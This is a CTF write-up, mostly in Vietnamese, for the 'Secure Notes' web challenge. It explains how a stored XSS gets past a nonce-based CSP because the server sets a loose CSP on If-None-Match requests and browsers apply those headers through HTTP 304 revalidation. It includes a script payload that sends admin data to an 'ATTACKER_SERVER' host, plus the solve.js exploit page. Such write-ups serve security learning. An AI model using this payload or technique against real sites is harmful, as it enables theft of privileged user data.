---
layout: single
title: "[BKISC CTF] Secure Notes - CSP Bypass via HTTP 304 Not Modified"
categories: ctf
tags: [web, xss, csp-bypass, http-304]
date: 2026-05-09
permalink: /writeups/secure-notes-csp-bypass/
header:
  teaser: /assets/images/tournaments/kashictf.png
---

## Challenge Info

**Event:** BKISC CTF  
**Challenge Name:** Secure Notes  
**Category:** Web  
**Difficulty:** Hard  
**Points:** 475  

**Challenge Description:**
```text
A secure note service.
- Objective: Thực thi mã XSS trên trình duyệt của Admin Bot để lấy flag tại `/api/admin/data`.
- Initial access: Source code NodeJS/ExpressJS đính kèm. Bot tự động sử dụng Puppeteer để truy cập URL được report.
```

<!-- more -->

---

## Initial Reconnaissance

### Understanding the Challenge

- **Goal:** Đọc được nội dung `/api/admin/data` (chứa flag) mà chỉ Admin mới có quyền truy cập.
- **Type:** Web Security (XSS, Content Security Policy, HTTP Caching).
- **Skills Required:** Hiểu rõ cơ chế HTTP Caching (ETag, 304 Not Modified), ExpressJS response lifecycle, và CSP.

### Information Gathering

Đọc source code (`app.js`), ta thấy các điểm đáng chú ý sau:
1. Endpoint `POST /api/note` cho phép tạo ghi chú. Nó có filter thẻ `<meta>` nhưng hoàn toàn **cho phép thẻ `<script>`** => **Stored XSS**.
2. Endpoint `GET /note/:id` trả về giao diện xem ghi chú. Mặc định nó đi kèm với Header CSP rất chặt chẽ sử dụng Nonce ngẫu nhiên: `script-src 'nonce-...';`. Điều này khiến mã XSS của ta không thể chạy.
3. Bot sử dụng headless Chrome (Puppeteer) và không bị disable cache.

**Key Observations:**
Điểm thú vị nhất nằm ở logic xử lý CSP của endpoint `GET /note/:id`:

```javascript
const isConditional = !!req.headers['if-none-match'];

if (!isConditional) {
    note.lastFreshView = Date.now();
}

const shareAfterLastView = note.shareTime && note.lastFreshView && note.shareTime > note.lastFreshView;

if (note.shared && isConditional && shareAfterLastView) {
    res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline'; script-src 'unsafe-inline' *; connect-src *; img-src *");
} else {
    const nonce = crypto.randomBytes(16).toString('base64');
    res.setHeader('Content-Security-Policy', `default-src 'self'; script-src 'nonce-${nonce}'`);
}
res.setHeader('Cache-Control', 'no-cache');
res.send(`...`);
```

---

## Enumeration & Analysis

### Step 1: Identify the Vulnerability

Mục tiêu là chui vào nhánh `if` bên trên để CSP trở thành `'unsafe-inline'`, từ đó mã XSS có thể hoạt động.
Để vào được nhánh này, ta cần 3 điều kiện:
1. `note.shared == true`
2. `isConditional == true` (Request phải có header `If-None-Match`).
3. `shareAfterLastView == true` (Thời gian share note phải LỚN HƠN thời gian note được truy cập lần cuối cùng mà không dùng cache).

### Step 2: Understand the Attack Vector

**Tại sao HTTP 304 lại nguy hiểm ở đây?**
Hàm `res.send()` của Express mặc định tự động tính toán ETag cho nội dung HTML trả về. 
- Mặc dù Header có `Cache-Control: no-cache`, trình duyệt vẫn sẽ lưu HTML vào cache, nhưng bị **bắt buộc** phải xác thực lại (revalidate) với server ở lần truy cập kế tiếp bằng cách gửi header `If-None-Match: <ETag>`.
- Về phía Bot (user `admin`), nội dung HTML sinh ra hoàn toàn không có sự khác biệt (do Bot không phải owner của bài viết, nên thẻ `<button>` Share/Unshare không được render). Điều này khiến ETag ở lần 1 và lần 2 giống hệt nhau.
- Khi Express thấy ETag khớp, nó sẽ chuyển HTTP Status thành `304 Not Modified`, cắt bỏ body HTML và chỉ trả về các Headers.
- **Trình duyệt khi nhận HTTP 304 sẽ tiến hành cập nhật (ghi đè) các Headers mới vào Cache cũ**. Nhờ đó, CSP lỏng lẻo mới sẽ được áp dụng trực tiếp lên đoạn HTML chứa mã XSS đang nằm sẵn trong Cache!

---

## Exploitation

### Attack Strategy

**Hypothesis:** Ta sẽ thao túng quá trình duyệt web của Admin Bot thông qua một trang web do ta tự host (Exploit Page).

### Exploitation Steps

#### Step 1: Chuẩn bị Note chứa XSS
Tạo một Note mới (chưa share) với nội dung:
```javascript
<script>
    fetch('/api/admin/data')
        .then(r => r.text())
        .then(d => fetch('https://ATTACKER_SERVER/flag?data=' + encodeURIComponent(d)))
</script>
```

#### Step 2: Đầu độc Cache của Bot (Phase 1)
Báo cáo (report) trang Exploit của chúng ta cho Admin Bot. Trang Exploit sẽ dùng `window.open('/note/ID')` để ép Bot mở Note lên.
- Bot truy cập lần 1 -> Lưu HTML chứa XSS vào Cache với CSP an toàn. 
- Lúc này `lastFreshView` trên server cập nhật thành thời điểm hiện tại.

#### Step 3: Trigger tính năng Share
Sau khi Bot đã lưu cache (khoảng 1.5 giây), trang Exploit gọi về server Attacker để tự động trigger API `/api/note/ID/share`.
- Lúc này `note.shareTime` sẽ được cập nhật và chắc chắn **lớn hơn** `lastFreshView` của Bot.

#### Step 4: Re-validation & Execute (Phase 2)
Trang Exploit ép cửa sổ `window.open` tải lại (`w.location = ...`).
- Trình duyệt Bot tìm thấy Cache cũ -> Gửi request kèm `If-None-Match`.
- Server kiểm tra: `note.shared` (OK) + `isConditional` (OK) + `shareAfterLastView` (OK) -> Trả về CSP `unsafe-inline` cùng mã 304 Not Modified.
- Trình duyệt Bot cập nhật CSP mới vào Cache -> XSS được thực thi -> Lấy Flag!

### Final Exploit Code

```javascript
// solve.js - Đoạn mã gắn trên trang Exploit của Hacker
let w = window.open('http://localhost:3000/note/ID_CUA_NOTE', 'target');
        
setTimeout(() => {
    // Kích hoạt API Share
    fetch('https://ATTACKER_SERVER/share').then(() => {
        // Ép bot load lại url để lấy 304
        w.location = 'http://localhost:3000/note/ID_CUA_NOTE';
    });
}, 1500);
```

**Result:**
```
[!!!] FLAG RECEIVED [!!!]
{"flag":"BKISC{I_th0ught_I_w4s_s3cur3_but_chr0me_1s_4lw4ys_s0m3thing_n3w_69e086984dab}"}
```

---

## Key Lessons Learned

### Technical Insights

1. **Vulnerability Root Cause**
   - Sự nguy hiểm tiềm tàng khi thay đổi các Security Headers (như CSP) dựa trên trạng thái cache (`If-None-Match`).
   - Việc lạm dụng tính năng Auto-ETag của Express khi dữ liệu nhạy cảm được nhúng động.

2. **Attack Pattern Recognition**
   - Khi gặp một bài Web có Stored XSS nhưng bị vướng CSP chặt, hãy kiểm tra ngay các Endpoint có xử lý `If-None-Match`, `ETag`, hoặc trả về HTTP 304.
   - HTTP 304 có thể ghi đè Headers của trình duyệt - một tính năng thường bị developer bỏ qua khi thiết kế hệ thống.

---

## Solution Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Reconnaissance | Phát hiện bộ đệm ETag tự động sinh ra mã HTTP 304 và logic thay đổi CSP. |
| 2 | Attack Chain | Bắt Bot load note (để lưu Cache) -> Share Note -> Bắt Bot load lại note. |
| 3 | Exploitation | Cache của Bot bị đè CSP mới (`unsafe-inline`) -> XSS thực thi. |
| 4 | Data Exfiltration | XSS lấy flag tại `/api/admin/data` gửi về C2 Server. |

---

## References & Resources

- 📚 [RFC 7234 - HTTP/1.1 Caching (Section 4.3.4: Updating Stored Responses)](https://datatracker.ietf.org/doc/html/rfc7234#section-4.3.4)
- 🔗 [MDN Web Docs - ETag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag)
- 🔗 [ExpressJS - res.send() and ETag generation](https://expressjs.com/en/api.html)

**Last Updated:** {{ page.date | date: "%Y-%m-%d" }}
